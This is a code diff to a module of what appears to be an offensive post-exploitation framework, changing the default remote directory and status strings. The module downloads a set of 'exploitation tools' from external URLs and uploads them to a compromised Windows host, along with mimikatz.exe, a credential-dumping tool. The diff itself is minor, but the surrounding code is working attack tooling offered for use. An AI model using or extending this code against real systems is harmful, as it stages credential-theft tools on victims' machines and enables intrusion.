@@ -27,8 +27,8 @@ class PopulateWinModule(KoiModule):
     arguments   = [
         {
             "flags":   ["-o", "--output-dir"],
-            "default": "C:\\Windows\\Temp",
-            "help":    "Remote directory where tools will be saved",
+            "default": None,
+            "help":    "Remote directory where tools will be saved (default: current directory)",
         },
     ]
 
@@ -49,16 +49,16 @@ class PopulateWinModule(KoiModule):
             os.unlink(tmp_path)
 
     def run(self) -> None:
-        out_dir = (self.args.output_dir or "C:\\Windows\\Temp").rstrip("\\")
+        out_dir = (self.args.output_dir or ".").rstrip("\\")
 
-        self.status(f"Populating {out_dir} with exploitation tools…")
+        self.status(f"Populating {out_dir} with exploitation tools...")
         print()
 
         results: dict[str, str] = {}
 
         for name, url in TOOLS.items():
             dest = f"{out_dir}\\{name}"
-            with self.spinner(f"Fetching and uploading {name}…"):
+            with self.spinner(f"Fetching and uploading {name}..."):
                 try:
                     raw = self._fetch_url(url)
                     ok  = self._upload_bytes(raw, dest)
@@ -72,7 +72,7 @@ class PopulateWinModule(KoiModule):
             results[name] = dest if ok else "FAILED"
 
         dest = f"{out_dir}\\mimikatz.exe"
-        with self.spinner("Downloading mimikatz…"):
+        with self.spinner("Downloading mimikatz..."):
             try:
                 raw = self._fetch_mimikatz_exe()
                 ok  = self._upload_bytes(raw, dest)
